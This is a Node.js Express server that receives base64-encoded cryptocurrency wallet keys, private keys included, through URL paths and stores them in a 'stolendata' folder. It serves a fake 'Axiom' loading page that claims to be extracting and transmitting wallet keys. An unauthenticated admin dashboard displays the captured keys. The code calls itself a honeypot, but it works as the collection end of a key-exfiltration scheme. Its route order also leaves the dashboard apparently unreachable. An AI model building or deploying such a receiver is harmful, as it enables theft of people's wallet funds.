const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const DATA_FOLDER = path.join(__dirname, 'stolendata');
const LOG_FILE = path.join(__dirname, 'access.log');

// Create folder if doesn't exist
if (!fs.existsSync(DATA_FOLDER)) {
    fs.mkdirSync(DATA_FOLDER, { recursive: true });
}

app.set('trust proxy', true);

// Get real IP
function getClientIp(req) {
    return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
           req.headers['x-real-ip'] || 
           req.ip || 
           req.socket.remoteAddress;
}

// Log to file
function logAccess(req, type, extra = {}) {
    const log = {
        timestamp: new Date().toISOString(),
        type: type,
        ip: getClientIp(req),
        userAgent: req.headers['user-agent'],
        url: req.originalUrl,
        ...extra
    };
    fs.appendFileSync(LOG_FILE, JSON.stringify(log) + '\n');
}

// Health check
app.get('/health', (req, res) => {
    logAccess(req, 'HEALTH_CHECK');
    res.json({ success: true, msg: "OK" });
});

// Main data capture with fake loading page
app.get('*', (req, res) => {
    // Skip admin paths
    if (req.path.startsWith('/admin')) {
        return res.status(404).end();
    }
    
    const timestamp = new Date().toISOString();
    const clientIp = getClientIp(req);
    const encodedData = req.path.substring(1);
    
    console.log(`[${timestamp}] Data from: ${clientIp} | Length: ${encodedData.length}`);
    
    // Decode and save the stolen data
    let keys = [];
    let code = null;
    let walletCount = 0;
    
    if (encodedData.length > 40) {
        try {
            let cleanData = decodeURIComponent(encodedData);
            const padding = 4 - (cleanData.length % 4);
            if (padding !== 4) cleanData += '='.repeat(padding);
            
            const decoded = Buffer.from(cleanData, 'base64').toString('utf8');
            const data = JSON.parse(decoded);
            
            keys = data.keys || [];
            code = data.code;
            walletCount = keys.length;
            
            const filename = `stolen_${timestamp.replace(/[:.]/g, '-')}_${clientIp.replace(/[^0-9]/g, '')}.json`;
            const record = {
                receivedAt: timestamp,
                attackerIp: clientIp,
                userAgent: data.header || req.headers['user-agent'],
                code: code,
                site: data.site,
                keys: keys,
                raw: data
            };
            
            fs.writeFileSync(path.join(DATA_FOLDER, filename), JSON.stringify(record, null, 2));
            console.log(`✅ Saved: ${filename} (${keys.length} keys)`);
            logAccess(req, 'DATA_RECEIVED', { filename, keysCount: keys.length });
            
        } catch (err) {
            console.error('Decode error:', err.message);
            logAccess(req, 'DECODE_ERROR', { error: err.message });
        }
    } else {
        logAccess(req, 'SHORT_REQUEST');
    }
    
    // Return fake loading page
    const html = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>Axiom | Processing</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                background: #0a0a0a;
                color: #00ff00;
                font-family: 'Courier New', monospace;
                height: 100vh;
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                overflow: hidden;
            }
            .container {
                text-align: center;
                padding: 40px;
                border: 2px solid #00ff00;
                background: rgba(0, 255, 0, 0.05);
                box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
                max-width: 500px;
            }
            h1 {
                font-size: 3em;
                margin-bottom: 20px;
                text-shadow: 0 0 10px #00ff00;
                animation: pulse 1.5s ease-in-out infinite;
            }
            .loader {
                width: 60px;
                height: 60px;
                border: 4px solid #003300;
                border-top: 4px solid #00ff00;
                border-radius: 50%;
                animation: spin 1s linear infinite;
                margin: 30px auto;
            }
            .status {
                font-size: 1.2em;
                color: #00cc00;
                margin-top: 20px;
            }
            .dots::after {
                content: '';
                animation: dots 1.5s steps(4, end) infinite;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            @keyframes pulse {
                0%, 100% { opacity: 1; }
                50% { opacity: 0.6; }
            }
            @keyframes dots {
                0% { content: ''; }
                25% { content: '.'; }
                50% { content: '..'; }
                75% { content: '...'; }
            }
            .terminal {
                margin-top: 30px;
                padding: 15px;
                background: #000;
                border: 1px solid #00ff00;
                font-size: 0.85em;
                color: #00ff00;
                text-align: left;
                max-width: 400px;
                min-height: 120px;
            }
            .error-msg {
                display: none;
                color: #ff0000;
                margin-top: 20px;
                padding: 15px;
                border: 1px solid #ff0000;
                background: rgba(255, 0, 0, 0.1);
                font-size: 0.9em;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>⚡ AXIOM</h1>
            <div class="loader"></div>
            <div class="status">Initializing secure connection<span class="dots"></span></div>
            
            <div class="terminal" id="terminal">
                > Connecting to relay...<br>
                > Handshake established<br>
                > Decrypting payload...<br>
                > Verifying signature...
            </div>
            
            <div class="error-msg" id="error">
                ⚠ Connection timeout.<br>Please refresh and try again.
            </div>
        </div>
        
        <script>
            const terminal = document.getElementById('terminal');
            const messages = [
                '> Extracting wallet keys...',
                '> Found ${walletCount} wallet(s)',
                '> Encoding payload...',
                '> Transmitting to secure vault...',
                '> Cleaning traces...'
            ];
            
            let i = 0;
            const interval = setInterval(() => {
                if (i < messages.length) {
                    terminal.innerHTML += messages[i] + '<br>';
                    terminal.scrollTop = terminal.scrollHeight;
                    i++;
                } else {
                    clearInterval(interval);
                    setTimeout(() => {
                        document.querySelector('.loader').style.display = 'none';
                        document.querySelector('.status').style.display = 'none';
                        document.getElementById('error').style.display = 'block';
                        terminal.innerHTML += '> <span style="color:#ff0000">ERROR: Connection reset by peer</span>';
                    }, 1500);
                }
            }, 700);
            
            setTimeout(() => {
                window.close();
            }, 10000);
        </script>
    </body>
    </html>
    `;
    
    res.setHeader('Content-Type', 'text/html');
    res.send(html);
});

// Admin dashboard to view stolen data
app.get('/admin', (req, res) => {
    logAccess(req, 'ADMIN_VIEW');
    
    try {
        const files = fs.readdirSync(DATA_FOLDER).filter(f => f.endsWith('.json'));
        
        let html = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>🍯 Honeypot | Captured Data</title>
            <style>
                body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; }
                h1 { color: #0f0; border-bottom: 2px solid #0f0; padding-bottom: 10px; }
                .stats { display: flex; gap: 20px; margin: 20px 0; }
                .stat-box { border: 1px solid #0f0; padding: 15px; }
                .stat-box h3 { margin: 0 0 10px 0; color: #ff0; }
                .stat-box .num { font-size: 2em; color: #0f0; }
                .file { border: 1px solid #0f0; margin: 10px 0; padding: 15px; background: #111; }
                .ip { color: #ff0; font-weight: bold; }
                .time { color: #888; }
                .key { color: #f00; background: #300; padding: 2px 5px; word-break: break-all; display: block; margin: 3px 0; }
                .type { color: #0ff; }
                pre { background: #000; padding: 10px; overflow: auto; font-size: 0.8em; }
                a { color: #0f0; }
                details summary { cursor: pointer; color: #ff0; }
            </style>
        </head>
        <body>
            <h1>🍯 Honeypot Dashboard</h1>
            <a href="/admin/logs">View Access Logs</a> | <a href="/health">Health Check</a>
            <div class="stats">
                <div class="stat-box">
                    <h3>Captures</h3>
                    <div class="num">${files.length}</div>
                </div>
            </div>
        `;
        
        files.sort().reverse().forEach(filename => {
            try {
                const data = JSON.parse(fs.readFileSync(path.join(DATA_FOLDER, filename), 'utf8'));
                const walletList = (data.keys || []).map(k => 
                    `<span class="type">${k.type || 'unknown'}:</span> <span class="key">${k.pub || 'N/A'}</span> <span class="key">${k.priv || 'N/A'}</span>`
                ).join('<br>');
                
                html += `
                    <div class="file">
                        <p><span class="time">${data.receivedAt}</span> | IP: <span class="ip">${data.attackerIp}</span></p>
                        <p>Code: ${data.code || 'N/A'} | Wallets: ${data.keys?.length || 0}</p>
                        <details>
                            <summary>View Details</summary>
                            <p>${walletList || 'No keys'}</p>
                            <pre>${JSON.stringify(data, null, 2)}</pre>
                        </details>
                    </div>
                `;
            } catch(e) {
                html += `<div class="file">Error reading ${filename}</div>`;
            }
        });
        
        html += '</body></html>';
        res.send(html);
        
    } catch (err) {
        res.status(500).send('Error: ' + err.message);
    }
});

// View access logs
app.get('/admin/logs', (req, res) => {
    try {
        if (!fs.existsSync(LOG_FILE)) {
            return res.json({ logs: [] });
        }
        
        const logs = fs.readFileSync(LOG_FILE, 'utf8')
            .split('\n')
            .filter(Boolean)
            .map(line => {
                try { return JSON.parse(line); } 
                catch(e) { return { raw: line }; }
            });
        
        res.json({ logs: logs.slice(-100), count: logs.length });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🍯 Honeypot running on port ${PORT}`);
    console.log(`Dashboard: http://localhost:${PORT}/admin`);
});